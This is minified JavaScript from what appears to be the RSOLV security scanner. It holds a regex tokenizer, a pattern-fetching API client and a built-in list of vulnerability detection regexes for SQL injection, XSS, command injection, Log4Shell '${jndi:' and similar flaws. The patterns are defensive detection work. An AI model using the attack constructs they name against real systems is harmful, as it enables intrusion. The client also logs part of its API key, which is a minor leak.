V=[],K,Z,q=/\\(?:(w)|(d)|(s)|(W)|(D)|(S))|((?:(?:\\)(.)|([^\]\\]))-(((?:\\)])|(((?:\\)?([^\]])))))|(\])|(?:\\)?([^])/g;while((K=q.exec(X))!==null){let B=($=(z=(H=(G=(W=(Y=(Q=K[1]&&E8.words())!==null&&Q!==void 0?Q:K[2]&&E8.ints())!==null&&Y!==void 0?Y:K[3]&&E8.whitespace())!==null&&W!==void 0?W:K[4]&&E8.notWords())!==null&&G!==void 0?G:K[5]&&E8.notInts())!==null&&H!==void 0?H:K[6]&&E8.notWhitespace())!==null&&z!==void 0?z:K[7]&&{type:G$.types.RANGE,from:(K[8]||K[9]).charCodeAt(0),to:(Z=K[10]).charCodeAt(Z.length-1)})!==null&&$!==void 0?$:(Z=K[16])&&{type:G$.types.CHAR,value:Z.charCodeAt(0)};if(B)V.push(B);else return[V,q.lastIndex]}throw SyntaxError(`Invalid regular expression: /${J}/: Unterminated character class`)}});var q2=v((W6)=>{var aC=W6&&W6.__createBinding||(Object.create?function(X,J,Q,Y){if(Y===void 0)Y=Q;Object.defineProperty(X,Y,{enumerable:!0,get:function(){return J[Q]}})}:function(X,J,Q,Y){if(Y===void 0)Y=Q;X[Y]=J[Q]}),nC=W6&&W6.__setModuleDefault||(Object.create?function(X,J){Object.defineProperty(X,"default",{enumerable:!0,value:J})}:function(X,J){X.default=J}),V$=W6&&W6.__importStar||function(X){if(X&&X.__esModule)return X;var J={};if(X!=null){for(var Q in X)if(Q!=="default"&&Object.prototype.hasOwnProperty.call(X,Q))aC(J,X,Q)}return nC(J,X),J};Object.defineProperty(W6,"__esModule",{value:!0});W6.tokenizer=void 0;var z$=V$(H$()),x0=I6(),SX=V$(F5()),sC=/^[a-zA-Z_$]$/i,oC=/^[a-zA-Z0-9_$]$/i,$$=/\d/;W6.tokenizer=(X)=>{let J=0,Q,Y={type:x0.types.ROOT,stack:[]},W=Y,G=Y.stack,H=[],z=[],$=0,V=(Z)=>{throw SyntaxError(`Invalid regular expression: /${X}/: Nothing to repeat at column ${Z-1}`)},K=z$.strToChars(X);while(J<K.length)switch(Q=K[J++]){case"\\":if(J===K.length)throw SyntaxError(`Invalid regular expression: /${X}/: \\ at end of pattern`);switch(Q=K[J++]){case"b":G.push({type:x0.types.POSITION,value:"b"});break;case"B":G.push({type:x0.types.POSITION,value:"B"});break;case"w":G.push(SX.words());break;case"W":G.push(SX.notWords());break;case"d":G.push(SX.ints());break;case"D":G.push(SX.notInts());break;case"s":G.push(SX.whitespace());break;case"S":G.push(SX.notWhitespace());break;default:if($$.test(Q)){let Z=Q;while(J<K.length&&$$.test(K[J]))Z+=K[J++];let q=parseInt(Z,10),B={type:x0.types.REFERENCE,value:q};G.push(B),z.push({reference:B,stack:G,index:G.length-1})}else G.push({type:x0.types.CHAR,value:Q.charCodeAt(0)})}break;case"^":G.push({type:x0.types.POSITION,value:"^"});break;case"$":G.push({type:x0.types.POSITION,value:"$"});break;case"[":{let Z;if(K[J]==="^")Z=!0,J++;else Z=!1;let q=z$.tokenizeClass(K.slice(J),X);J+=q[1],G.push({type:x0.types.SET,set:q[0],not:Z});break}case".":G.push(SX.anyChar());break;case"(":{let Z={type:x0.types.GROUP,stack:[],remember:!0};if(K[J]==="?")if(Q=K[J+1],J+=2,Q==="=")Z.followedBy=!0,Z.remember=!1;else if(Q==="!")Z.notFollowedBy=!0,Z.remember=!1;else if(Q==="<"){let q="";if(sC.test(K[J]))q+=K[J],J++;else throw SyntaxError(`Invalid regular expression: /${X}/: Invalid capture group name, character '${K[J]}' after '<' at column ${J+1}`);while(J<K.length&&oC.test(K[J]))q+=K[J],J++;if(!q)throw SyntaxError(`Invalid regular expression: /${X}/: Invalid capture group name, character '${K[J]}' after '<' at column ${J+1}`);if(K[J]!==">")throw SyntaxError(`Invalid regular expression: /${X}/: Unclosed capture group name, expected '>', found '${K[J]}' at column ${J+1}`);Z.name=q,J++}else if(Q===":")Z.remember=!1;else throw SyntaxError(`Invalid regular expression: /${X}/: Invalid group, character '${Q}' after '?' at column ${J-1}`);else $+=1;G.push(Z),H.push(W),W=Z,G=Z.stack;break}case")":if(H.length===0)throw SyntaxError(`Invalid regular expression: /${X}/: Unmatched ) at column ${J-1}`);W=H.pop(),G=W.options?W.options[W.options.length-1]:W.stack;break;case"|":{if(!W.options)W.options=[W.stack],delete W.stack;let Z=[];W.options.push(Z),G=Z;break}case"{":{let Z=/^(\d+)(,(\d+)?)?\}/.exec(K.slice(J)),q,B;if(Z!==null){if(G.length===0)V(J);q=parseInt(Z[1],10),B=Z[2]?Z[3]?parseInt(Z[3],10):1/0:q,J+=Z[0].length,G.push({type:x0.types.REPETITION,min:q,max:B,value:G.pop()})}else G.push({type:x0.types.CHAR,value:123});break}case"?":if(G.length===0)V(J);G.push({type:x0.types.REPETITION,min:0,max:1,value:G.pop()});break;case"+":if(G.length===0)V(J);G.push({type:x0.types.REPETITION,min:1,max:1/0,value:G.pop()});break;case"*":if(G.length===0)V(J);G.push({type:x0.types.REPETITION,min:0,max:1/0,value:G.pop()});break;default:G.push({type:x0.types.CHAR,value:Q.charCodeAt(0)})}if(H.length!==0)throw SyntaxError(`Invalid regular expression: /${X}/: Unterminated group`);return tC(z,$),Y};function tC(X,J){for(let Q of X.reverse())if(J<Q.reference.value){Q.reference.type=x0.types.CHAR;let Y=Q.reference.value.toString();if(Q.reference.value=parseInt(Y,8),!/^[0-7]+$/.test(Y)){let W=0;while(Y[W]!=="8"&&Y[W]!=="9")W+=1;if(W===0)Q.reference.value=Y.charCodeAt(0),W+=1;else Q.reference.value=parseInt(Y.slice(0,W),8);if(Y.length>W){let G=Q.stack.splice(Q.index+1);for(let H of Y.slice(W))Q.stack.push({type:x0.types.CHAR,value:H.charCodeAt(0)});Q.stack.push(...G)}}}}});var U$=v((l0)=>{var eC=l0&&l0.__createBinding||(Object.create?function(X,J,Q,Y){if(Y===void 0)Y=Q;Object.defineProperty(X,Y,{enumerable:!0,get:function(){return J[Q]}})}:function(X,J,Q,Y){if(Y===void 0)Y=Q;X[Y]=J[Q]}),XP=l0&&l0.__setModuleDefault||(Object.create?function(X,J){Object.defineProperty(X,"default",{enumerable:!0,value:J})}:function(X,J){X.default=J}),JP=l0&&l0.__importStar||function(X){if(X&&X.__esModule)return X;var J={};if(X!=null){for(var Q in X)if(Q!=="default"&&Object.prototype.hasOwnProperty.call(X,Q))eC(J,X,Q)}return XP(J,X),J};Object.defineProperty(l0,"__esModule",{value:!0});l0.NOTANYCHAR=l0.WHITESPACE=l0.WORDS=l0.INTS=void 0;var R5=JP(F5()),K$=I6();function A5(X){let J={},Q=0;for(let Y of X){if(Y.type===K$.types.CHAR)J[Y.value]=!0;if(Y.type===K$.types.RANGE)J[`${Y.from}-${Y.to}`]=!0;Q+=1}return{lookup:()=>Object.assign({},J),len:Q}}l0.INTS=A5(R5.ints().set);l0.WORDS=A5(R5.words().set);l0.WHITESPACE=A5(R5.whitespace().set);l0.NOTANYCHAR=A5(R5.anyChar().set)});var q$=v((w9)=>{var QP=w9&&w9.__createBinding||(Object.create?function(X,J,Q,Y){if(Y===void 0)Y=Q;Object.defineProperty(X,Y,{enumerable:!0,get:function(){return J[Q]}})}:function(X,J,Q,Y){if(Y===void 0)Y=Q;X[Y]=J[Q]}),YP=w9&&w9.__setModuleDefault||(Object.create?function(X,J){Object.defineProperty(X,"default",{enumerable:!0,value:J})}:function(X,J){X.default=J}),WP=w9&&w9.__importStar||function(X){if(X&&X.__esModule)return X;var J={};if(X!=null){for(var Q in X)if(Q!=="default"&&Object.prototype.hasOwnProperty.call(X,Q))QP(J,X,Q)}return YP(J,X),J};Object.defineProperty(w9,"__esModule",{value:!0});w9.writeSetTokens=w9.setChar=void 0;var L5=I6(),D5=WP(U$());function N5(X){return X===94?"\\^":X===92?"\\\\":X===93?"\\]":X===45?"\\-":String.fromCharCode(X)}w9.setChar=N5;function w5(X,{lookup:J,len:Q}){if(Q!==X.length)return!1;let Y=J();for(let W of X){if(W.type===L5.types.SET)return!1;let G=W.type===L5.types.CHAR?W.value:`${W.from}-${W.to}`;if(Y[G])Y[G]=!1;else return!1}return!0}function Z$(X,J=!1){if(w5(X.set,D5.INTS))return X.not?"\\D":"\\d";if(w5(X.set,D5.WORDS))return X.not?"\\W":"\\w";if(X.not&&w5(X.set,D5.NOTANYCHAR))return".";if(w5(X.set,D5.WHITESPACE))return X.not?"\\S":"\\s";let Q="";for(let W=0;W<X.set.length;W++){let G=X.set[W];Q+=GP(G)}let Y=`${X.not?"^":""}${Q}`;return J?Y:`[${Y}]`}w9.writeSetTokens=Z$;function GP(X){if(X.type===L5.types.CHAR)return N5(X.value);else if(X.type===L5.types.RANGE)return`${N5(X.from)}-${N5(X.to)}`;return Z$(X,!0)}});var M2=v((j$)=>{Object.defineProperty(j$,"__esModule",{value:!0});j$.reconstruct=void 0;var XX=I6(),B2=q$(),B$=(X)=>X.map(j$.reconstruct).join(""),M$=(X)=>{if("options"in X)return X.options.map(B$).join("|");else if("stack"in X)return B$(X.stack);else throw Error("options or stack must be Root or Group token")};j$.reconstruct=(X)=>{switch(X.type){case XX.types.ROOT:return M$(X);case XX.types.CHAR:{let J=String.fromCharCode(X.value);return(/[[\\{}$^.|?*+()]/.test(J)?"\\":"")+J}case XX.types.POSITION:if(X.value==="^"||X.value==="$")return X.value;else return`\\${X.value}`;case XX.types.REFERENCE:return`\\${X.value}`;case XX.types.SET:return B2.writeSetTokens(X);case XX.types.GROUP:return`(${X.name?`?<${X.name}>`:X.remember?"":X.followedBy?"?=":X.notFollowedBy?"?!":"?:"}${M$(X)})`;case XX.types.REPETITION:{let{min:J,max:Q}=X,Y;if(J===0&&Q===1)Y="?";else if(J===1&&Q===1/0)Y="+";else if(J===0&&Q===1/0)Y="*";else if(Q===1/0)Y=`{${J},}`;else if(J===Q)Y=`{${J}}`;else Y=`{${J},${Q}}`;return`${j$.reconstruct(X.value)}${Y}`}case XX.types.RANGE:return`${B2.setChar(X.from)}-${B2.setChar(X.to)}`;default:throw Error(`Invalid token type ${X}`)}}});var R$=v((N9,C5)=>{var HP=N9&&N9.__createBinding||(Object.create?function(X,J,Q,Y){if(Y===void 0)Y=Q;Object.defineProperty(X,Y,{enumerable:!0,get:function(){return J[Q]}})}:function(X,J,Q,Y){if(Y===void 0)Y=Q;X[Y]=J[Q]}),j2=N9&&N9.__exportStar||function(X,J){for(var Q in X)if(Q!=="default"&&!Object.prototype.hasOwnProperty.call(J,Q))HP(J,X,Q)};Object.defineProperty(N9,"__esModule",{value:!0});N9.types=void 0;var O$=I6();Object.defineProperty(N9,"types",{enumerable:!0,get:function(){return O$.types}});j2(q2(),N9);j2(M2(),N9);var F$=q2(),zP=M2();j2(I6(),N9);N9.default=F$.tokenizer;C5.exports=F$.tokenizer;C5.exports.types=O$.types;C5.exports.reconstruct=zP.reconstruct});var D$=v((Dg1,P5)=>{var A$=R$(),$P=A$.types;function O2(X,J){if(!J)J={};let Q=J.limit===void 0?25:J.limit;if(VP(X))X=X.source;else if(typeof X!=="string")X=String(X);try{X=A$(X)}catch{return!1}let Y=0;return function W(G,H){let z,$,V;if(G.type===$P.REPETITION){if(H++,Y++,H>1)return!1;if(Y>Q)return!1}if(G.options){for(z=0,V=G.options.length;z<V;z++)if($=W({stack:G.options[z]},H),!$)return!1}let K=G.stack||G.value?.stack;if(!K)return!0;for(z=0;z<K.length;z++)if($=W(K[z],H),!$)return!1;return!0}(X,0)}function VP(X){return{}.toString.call(X)==="[object RegExp]"}P5.exports=O2;P5.exports.default=O2;P5.exports.safeRegex=O2});var TX=()=>{};function KP(X){return X&&typeof X==="object"&&X.__type__==="regex"&&typeof X.source==="string"&&Array.isArray(X.flags)}class S5{apiUrl;apiKey;cache=new Map;cacheTTL;fallbackToLocal;constructor(X={}){let Q=(X.apiUrl||process.env.RSOLV_API_URL||"https://api.rsolv.dev").replace(/\/$/,"");if(this.apiUrl=Q.includes("/api/v1/patterns")?Q:`${Q}/api/v1/patterns`,this.apiKey=X.apiKey||process.env.RSOLV_API_KEY,this.cacheTTL=(X.cacheTTL||3600)*1000,this.fallbackToLocal=X.fallbackToLocal??!0,!this.apiKey)U.warn("No RSOLV API key provided - only demo patterns available");else U.debug("PatternAPIClient initialized with API key",{keyLength:this.apiKey.length,keyPrefix:this.apiKey.substring(0,10)+"...",keyFromConfig:!!X.apiKey,keyFromEnv:!X.apiKey&&!!process.env.RSOLV_API_KEY})}async fetchPatterns(X){let J=`${X}-${this.apiKey||"demo"}`,Q=this.cache.get(J);if(Q&&Date.now()-Q.timestamp<this.cacheTTL)return U.info(`Using cached patterns for ${X} (${Q.patterns.length} patterns)`),{patterns:Q.patterns,fromCache:!0};try{let Y={"Content-Type":"application/json"};if(this.apiKey)Y["x-api-key"]=this.apiKey;let W=await fetch(`${this.apiUrl}?language=${X}&format=enhanced`,{headers:Y});if(!W.ok)throw Error(`Failed to fetch patterns: ${W.status} ${W.statusText}`);let G=await W.json(),H=G.metadata?.count||G.count||G.patterns.length;U.info(`Fetched ${H} ${X} patterns from API`);let z=G.patterns.map(($)=>this.convertToSecurityPattern($));return this.cache.set(J,{patterns:z,timestamp:Date.now()}),{patterns:z,fromCache:!1}}catch(Y){if(U.error(`Failed to fetch ${X} patterns from API:`,Y),this.fallbackToLocal)return U.warn(`Falling back to local patterns for ${X}`),{patterns:[],fromCache:!1};throw Y}}convertToSecurityPattern(X){let J=this.reconstructPattern(X),Q=[];if(J.regex){let G=J.regex;if(typeof G==="string")Q=[G];else if(Array.isArray(G))Q=G}else if(Array.isArray(J.regex_patterns))Q=J.regex_patterns;else if(Array.isArray(J.patterns))Q=J.patterns;else if(J.patterns&&typeof J.patterns==="object"&&"regex"in J.patterns&&Array.isArray(J.patterns.regex))Q=J.patterns.regex;else U.warn(`No regex patterns found for ${J.id}`),Q=[];let Y=Q.map((G)=>{try{if(G instanceof RegExp)return G;if(typeof G==="string"){let H=G.match(/^\/(.*)\/([gimsuvy]*)$/);if(H)return new RegExp(H[1],H[2]);return new RegExp(G)}return U.warn(`Unexpected pattern type for ${J.id}:`,G),null}catch(H){return U.warn(`Failed to compile regex for pattern ${J.id}: ${G}`),U.error(String(H)),null}}).filter(Boolean),W=J.context_rules||void 0;return{id:J.id,name:J.name,type:this.mapVulnerabilityType(J.type),severity:J.severity,description:J.description,patterns:{regex:Y,ast:J.ast_rules?[JSON.stringify(J.ast_rules)]:void 0},languages:J.languages,cweId:J.cwe_id||J.cweId||"",owaspCategory:J.owasp_category||J.owaspCategory||"",remediation:J.recommendation,examples:{vulnerable:J.test_cases?.vulnerable?.[0]||J.testCases?.vulnerable?.[0]||"",secure:J.test_cases?.safe?.[0]||J.testCases?.safe?.[0]||""},astRules:J.ast_rules,contextRules:W,confidenceRules:J.confidence_rules,minConfidence:J.min_confidence}}mapVulnerabilityType(X){return{sql_injection:"sql_injection",xss:"xss",command_injection:"command_injection",path_traversal:"path_traversal",xxe:"xml_external_entities",ssrf:"server_side_request_forgery",insecure_deserialization:"insecure_deserialization",deserialization:"insecure_deserialization",weak_crypto:"weak_cryptography",hardcoded_secret:"hardcoded_secrets",insecure_random:"weak_cryptography",open_redirect:"open_redirect",ldap_injection:"ldap_injection",xpath_injection:"xpath_injection",nosql_injection:"nosql_injection",rce:"command_injection",dos:"denial_of_service",denial_of_service:"denial_of_service",timing_attack:"information_disclosure",csrf:"cross_site_request_forgery",jwt:"broken_authentication",authentication:"broken_authentication",debug:"information_disclosure",information_disclosure:"information_disclosure",cve:"vulnerable_components",file_upload:"path_traversal",input_validation:"xss",session_management:"cross_site_request_forgery",resource_exhaustion:"denial_of_service"}[X]||"improper_input_validation"}clearCache(){this.cache.clear(),U.info("Pattern cache cleared")}convertRegexFlags(X){let J={i:"i",m:"m",s:"s",u:"u",g:"g",y:"y",d:"d"};return X.map((Q)=>J[Q]||"").filter(Boolean).join("")}reconstructRegex(X){let J=this.convertRegexFlags(X.flags);return new RegExp(X.source,J)}reconstructPattern(X){if(X===null||X===void 0)return X;if(KP(X))return this.reconstructRegex(X);if(Array.isArray(X))return X.map((J)=>this.reconstructPattern(J));if(typeof X==="object"){let J={};for(let[Q,Y]of Object.entries(X))J[Q]=this.reconstructPattern(Y);return J}return X}async checkHealth(){try{let X=await fetch(`${this.apiUrl}/health`,{method:"GET",headers:{"User-Agent":"RSOLV-Action/1.0"}});if(X.ok)return{status:"healthy"};else return{status:"unhealthy",message:`API returned status ${X.status}`}}catch(X){return{status:"unhealthy",message:X instanceof Error?X.message:"Unknown error"}}}}var F2=s(()=>{I1();TX()});function T5(){return[{id:"basic-sql-injection",name:"Basic SQL Injection",type:"sql_injection",severity:"high",description:"Potential SQL injection via string concatenation",patterns:{regex:[/["'`].*?(SELECT|INSERT|UPDATE|DELETE|DROP|CREATE|ALTER).*?["'`]\s*\+/gi,/execute\s*\(\s*['"`].*\+/gi]},languages:["javascript","typescript"],cweId:"CWE-89",owaspCategory:"A03:2021",remediation:"Use parameterized queries or prepared statements",examples:{vulnerable:"",secure:""}},{id:"basic-xss",name:"Basic Cross-Site Scripting",type:"xss",severity:"high",description:"Potential XSS via innerHTML",patterns:{regex:[/innerHTML\s*=\s*[^'"`;]*(userInput|userContent|req\.|request\.)/gi,/document\.write\s*\(/gi]},languages:["javascript","typescript"],cweId:"CWE-79",owaspCategory:"A03:2021",remediation:"Use textContent or proper encoding",examples:{vulnerable:"",secure:""}},{id:"basic-command-injection",name:"Basic Command Injection",type:"command_injection",severity:"critical",description:"Potential command injection",patterns:{regex:[/exec\s*\(\s*['"`].*\+/gi,/system\s*\(\s*['"`].*\+/gi]},languages:["javascript","python","ruby"],cweId:"CWE-78",owaspCategory:"A03:2021",remediation:"Validate and sanitize all user input",examples:{vulnerable:"",secure:""}},{id:"basic-path-traversal",name:"Basic Path Traversal",type:"path_traversal",severity:"high",description:"Potential path traversal vulnerability",patterns:{regex:[/readFile\s*\([^)]*\.\.\/[^)]*\)/gi,/path\.join\s*\([^)]*req\./gi]},languages:["javascript","typescript"],cweId:"CWE-22",owaspCategory:"A01:2021",remediation:"Validate and sanitize file paths",examples:{vulnerable:"",secure:""}},{id:"js-eval",name:"JavaScript Eval Usage",type:"command_injection",severity:"critical",description:"Use of eval() function",patterns:{regex:[/eval\s*\(/gi,/Function\s*\(/gi,/setTimeout\s*\([^,]*,[^,)]*\)/gi]},languages:["javascript","typescript"],cweId:"CWE-94",owaspCategory:"A03:2021",remediation:"Avoid eval(), use JSON.parse() or safer alternatives",examples:{vulnerable:"",secure:""}},{id:"python-sql-injection",name:"Python SQL Injection",type:"sql_injection",severity:"high",description:"SQL injection via string formatting or concatenation",patterns:{regex:[/\.raw\s*\(/gi,/execute\s*\(\s*["'].*%[s|d].*["']\s*%/gi,/execute\s*\(\s*["'].*\+.*["']\s*\)/gi,/cursor\.execute\s*\(\s*f["']/gi]},languages:["python"],cweId:"CWE-89",owaspCategory:"A03:2021",remediation:"Use parameterized queries with ? or %s placeholders",examples:{vulnerable:"",secure:""}},{id:"python-eval",name:"Python Eval Usage",type:"command_injection",severity:"critical",description:"Use of eval() with user input",patterns:{regex:[/eval\s*\(/gi,/exec\s*\(/gi]},languages:["python"],cweId:"CWE-94",owaspCategory:"A03:2021",remediation:"Avoid eval(), use ast.literal_eval() for safe evaluation",examples:{vulnerable:"",secure:""}},{id:"python-pickle",name:"Insecure Deserialization",type:"insecure_deserialization",severity:"high",description:"Use of pickle with untrusted data",patterns:{regex:[/pickle\.loads?\s*\(/gi,/cPickle\.loads?\s*\(/gi]},languages:["python"],cweId:"CWE-502",owaspCategory:"A08:2021",remediation:"Use JSON or other safe serialization formats",examples:{vulnerable:"",secure:""}},{id:"ruby-sql-injection",name:"Ruby SQL Injection",type:"sql_injection",severity:"high",description:"SQL injection via string interpolation",patterns:{regex:[/\.where\s*\(\s*["'].*#\{.*\}.*["']/gi,/find_by_sql\s*\(\s*["'].*#\{.*\}.*["']/gi,/execute\s*\(\s*["'].*#\{.*\}.*["']/gi]},languages:["ruby"],cweId:"CWE-89",owaspCategory:"A03:2021",remediation:"Use parameterized queries or ActiveRecord query interface",examples:{vulnerable:"",secure:""}},{id:"ruby-eval",name:"Ruby Eval Usage",type:"command_injection",severity:"critical",description:"Use of eval with user input",patterns:{regex:[/eval\s*\(/gi,/instance_eval\s*\(/gi]},languages:["ruby"],cweId:"CWE-94",owaspCategory:"A03:2021",remediation:"Avoid eval, use safe alternatives",examples:{vulnerable:"",secure:""}},{id:"ruby-yaml",name:"YAML Deserialization",type:"insecure_deserialization",severity:"high",description:"Unsafe YAML loading",patterns:{regex:[/YAML\.load\s*\(/gi,/Psych\.load\s*\(/gi]},languages:["ruby"],cweId:"CWE-502",owaspCategory:"A08:2021",remediation:"Use YAML.safe_load instead",examples:{vulnerable:"",secure:""}},{id:"java-sql-injection",name:"Java SQL Injection",type:"sql_injection",severity:"high",description:"SQL injection via string concatenation",patterns:{regex:[/\.?execute(?:Query|Update)?\s*\([^)]*\+[^)]*\)/gi,/String\s+\w*(?:query|sql|statement)\w*\s*=\s*["'].*(?:SELECT|INSERT|UPDATE|DELETE|DROP|CREATE|ALTER).*["']\s*\+/gi,/["'].*(?:SELECT|INSERT|UPDATE|DELETE|DROP|CREATE|ALTER|FROM|WHERE|JOIN|UNION|ORDER BY|GROUP BY).*["']\s*\+/gi,/(?:StringBuilder|StringBuffer)\s*\(?\s*["'].*(?:SELECT|INSERT|UPDATE|DELETE).*["']\s*\)?.*\.append\s*\(/gi,/String\.format\s*\(\s*["'].*(?:SELECT|INSERT|UPDATE|DELETE).*%[sd].*["']/gi,/prepareStatement\s*\([^)]*\+[^)]*\)/gi,/jdbcTemplate\.(?:query|update|execute)\s*\([^)]*\+[^)]*\)/gi]},languages:["java"],cweId:"CWE-89",owaspCategory:"A03:2021",remediation:"Use PreparedStatement with parameters",examples:{vulnerable:"",secure:""}},{id:"java-xxe",name:"XML External Entity",type:"xml_external_entities",severity:"high",description:"XML parser vulnerable to XXE",patterns:{regex:[/DocumentBuilderFactory\.newInstance\s*\(\s*\)/gi,/SAXParserFactory\.newInstance\s*\(\s*\)/gi]},languages:["java"],cweId:"CWE-611",owaspCategory:"A05:2021",remediation:"Disable external entities and DTD processing",examples:{vulnerable:"",secure:""}},{id:"php-sql-injection",name:"PHP SQL Injection",type:"sql_injection",severity:"high",description:"SQL injection via string concatenation or interpolation",patterns:{regex:[/["'].*(?:SELECT|INSERT|UPDATE|DELETE|DROP|CREATE|ALTER)[^"']*\$\w+/gi,/["'].*(?:SELECT|INSERT|UPDATE|DELETE|DROP|CREATE|ALTER).*\$(?:_GET|_POST|_REQUEST)\[/gi,/["'].*(?:SELECT|INSERT|UPDATE|DELETE).*["']\s*\.\s*\$(?:_GET|_POST|_REQUEST)/gi,/mysql_query\s*\([^)]*\.\s*\$/gi,/mysqli_query\s*\([^,)]*,[^)]*\.\s*\$/gi,/->exec\s*\([^)]*\.\s*\$/gi,/\$(?:query|sql)\s*=\s*["'].*(?:SELECT|INSERT|UPDATE|DELETE).*["']\s*\.\s*\$/gi,/["'].*(?:SELECT|INSERT|UPDATE|DELETE).*\{\$(?:_GET|_POST|_REQUEST)/gi]},languages:["php"],cweId:"CWE-89",owaspCategory:"A03:2021",remediation:"Use prepared statements with PDO or mysqli",examples:{vulnerable:"",secure:""}},{id:"php-eval",name:"PHP Eval Usage",type:"command_injection",severity:"critical",description:"Use of eval() function",patterns:{regex:[/eval\s*\(/gi,/assert\s*\(/gi]},languages:["php"],cweId:"CWE-94",owaspCategory:"A03:2021",remediation:"Avoid eval(), use safe alternatives",examples:{vulnerable:"",secure:""}},{id:"php-file-inclusion",name:"File Inclusion",type:"path_traversal",severity:"high",description:"Dynamic file inclusion",patterns:{regex:[/include\s*\(\s*\$_(?:GET|POST|REQUEST)/gi,/require\s*\(\s*\$_(?:GET|POST|REQUEST)/gi]},languages:["php"],cweId:"CWE-98",owaspCategory:"A03:2021",remediation:"Validate and whitelist file paths",examples:{vulnerable:"",secure:""}},{id:"elixir-code-eval",name:"Elixir Code Evaluation",type:"command_injection",severity:"critical",description:"Dynamic code evaluation",patterns:{regex:[/Code\.eval_string\s*\(/gi,/Code\.eval_quoted\s*\(/gi]},languages:["elixir"],cweId:"CWE-94",owaspCategory:"A03:2021",remediation:"Avoid dynamic code evaluation",examples:{vulnerable:"",secure:""}},{id:"elixir-atom-dos",name:"Atom DoS",type:"denial_of_service",severity:"medium",description:"Creating atoms from user input",patterns:{regex:[/String\.to_atom\s*\(/gi,/binary_to_atom\s*\(/gi]},languages:["elixir"],cweId:"CWE-400",owaspCategory:"A06:2021",remediation:"Use String.to_existing_atom instead",examples:{vulnerable:"",secure:""}},{id:"hardcoded-secret",name:"Hardcoded Secret",type:"hardcoded_secrets",severity:"high",description:"Hardcoded password or API key",patterns:{regex:[/password\s*=\s*["'][^"']{8,}["']/gi,/api_key\s*=\s*["'][^"']{20,}["']/gi]},languages:["javascript","typescript","python","ruby","java","php","elixir"],cweId:"CWE-798",owaspCategory:"A07:2021",remediation:"Use environment variables or secure key management",examples:{vulnerable:"",secure:""}},{id:"weak-crypto",name:"Weak Cryptography",type:"weak_cryptography",severity:"medium",description:"Use of weak cryptographic algorithms",patterns:{regex:[/MD5\s*\(/gi,/SHA1\s*\(/gi]},languages:["javascript","typescript","python","ruby","java","php"],cweId:"CWE-327",owaspCategory:"A02:2021",remediation:"Use SHA-256 or stronger algorithms",examples:{vulnerable:"",secure:""}},{id:"jwt-none-algorithm",name:"JWT None Algorithm",type:"broken_authentication",severity:"critical",description:"JWT allowing none algorithm",patterns:{regex:[/algorithm\s*:\s*["']none["']/gi,/verify\s*:\s*false/gi]},languages:["javascript","typescript","python","ruby"],cweId:"CWE-347",owaspCategory:"A02:2021",remediation:"Always verify JWT signatures",examples:{vulnerable:"",secure:""}},{id:"open-redirect",name:"Open Redirect",type:"open_redirect",severity:"medium",description:"Unvalidated redirect",patterns:{regex:[/redirect\s*\(\s*req\./gi,/location\.href\s*=\s*req\./gi]},languages:["javascript","typescript"],cweId:"CWE-601",owaspCategory:"A03:2021",remediation:"Validate redirect URLs against whitelist",examples:{vulnerable:"",secure:""}},{id:"nosql-injection",name:"NoSQL Injection",type:"nosql_injection",severity:"high",description:"MongoDB injection vulnerability",patterns:{regex:[/\$where\s*:/gi,/find\s*\(\s*{[^}]*\$ne\s*:/gi]},languages:["javascript","typescript"],cweId:"CWE-943",owaspCategory:"A03:2021",remediation:"Sanitize user input and use parameterized queries",examples:{vulnerable:"",secure:""}},{id:"log4j-jndi",name:"Log4j JNDI Injection (CVE-2021-44228)",type:"vulnerable_components",severity:"critical",description:"Log4Shell vulnerability pattern",patterns:{regex:[/\$\{jndi:/gi,/logger\.(?:info|warn|error|debug)\s*\([^)]*\$\{/gi]},languages:["java"],cweId:"CWE-502",owaspCategory:"A08:2021",remediation:"Update Log4j to version 2.17.0 or later",examples:{vulnerable:"",secure:""}},{id:"log-injection-console",name:"Log Injection via User Input",type:"log_injection",severity:"medium",description:"User input is logged without sanitization, potentially allowing log forging attacks",patterns:{regex:[/console\.(log|error|warn|info)\s*\([^)]*[\+`][^)]*\b(req|request|params|query|body|headers)\b/i,/logger\.(info|error|warn|debug|trace)\s*\([^)]*[\+`][^)]*\b(req|request|params|query|body|headers)\b/i,/winston\.(log|info|error|warn)\s*\([^)]*[\+`][^)]*\b(req|request|params|query|body|headers)\b/i,/process\.(stdout|stderr)\.write\s*\([^)]*[\+`][^)]*\b(req|request|params|query|body|headers)\b/i,/fs\.(appendFile|appendFileSync)\s*\([^,]*log[^,]*,[^)]*[\+`][^)]*\b(req|request|params|query|body|headers)\b/i]},languages:["javascript","typescript"],cweId:"CWE-117",owaspCategory:"A09:2021",remediation:"Sanitize user input before logging. Remove or encode newline characters and control sequences.",examples:{vulnerable:'console.log("User: " + req.query.username)',secure:'console.log("User:", sanitizeForLog(req.query.username))'}},{id:"crlf-injection-headers",name:"CRLF Injection in HTTP Headers",type:"crlf_injection",severity:"high",description:"User input is used in HTTP headers without sanitization, potentially allowing header injection",patterns:{regex:[/\.setHeader\s*\([^,]+,[^)]*\b(req|request|params|query|body|headers)\b/i,/\.writeHead\s*\([^,]+,\s*\{[^}]*\b(req|request|params|query|body|headers)\b/i,/res\.(set|header)\s*\([^,]+,[^)]*\b(req|request|params|query|body|headers)\b/i,/res\.write\s*\([^)]*[\+`][^)]*\b(req|request|params|query|body|headers)\b/i,/Set-Cookie['"]\s*,[^)]*[\+`][^)]*\b(req|request|params|query|body)\b/i,/\.setHeader\s*\([^,]+,[^)]*decodeURIComponent\s*\([^)]*\b(req|request|params|query)\b/i]},languages:["javascript","typescript"],cweId:"CWE-93",owaspCategory:"A03:2021",remediation:"Validate and sanitize all user input used in HTTP headers. Remove or encode CR (\\r) and LF (\\n) characters.",examples:{vulnerable:'res.setHeader("X-User", req.query.username)',secure:'res.setHeader("X-User", sanitizeHeaderValue(req.query.username))'}}]}function w$(X){let J=X.toLowerCase();return T5().filter((Y)=>Y.languages.includes(J)||J==="typescript"&&Y.languages.includes("javascript"))}var Tg1;var N$=s(()=>{TX();Tg1=T5()});class R2{client;supportedLanguages=["javascript","typescript","python","ruby","java","php","elixir"];constructor(X,J){this.client=new S5({apiKey:X,apiUrl:J,cacheEnabled:!0,cacheTTL:3600,fallbackToLocal:!1})}async getPatternsByLanguage(X){try{let J=await this.client.fetchPatterns(X.toLowerCase()),{patterns:Q,fromCache:Y}=J,W=Y?"cache":"API";return U.info(`✅ ApiPatternSource: Retrieved ${Q.length} ${X} patterns from ${W}`),U.info("PATTERN FETCH 